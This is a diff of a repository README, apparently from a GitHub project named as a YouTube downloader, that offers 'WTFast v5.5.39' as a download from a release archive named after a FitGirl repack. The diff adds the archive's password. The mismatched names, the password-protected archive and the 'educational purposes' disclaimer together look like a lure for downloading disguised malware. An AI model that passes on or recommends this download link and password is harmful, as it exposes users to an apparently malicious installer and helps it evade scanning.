@@ -43,8 +43,8 @@ This repository is provided for educational and informational purposes. All tool
 The repository includes a compressed archive with the complete desktop setup.
 
 📥 **[Download `WTFast v5.5.39`](https://github.com/postik342-svg/Video-Dowloader-Youtube-Desktop/releases/download/ddd/Repack.By.FitGirl.zip)**
-
-
+🔐 `LS2026`
+-
 ### Archive Contents
 
 * `WTFast_Setup.exe` – desktop installer
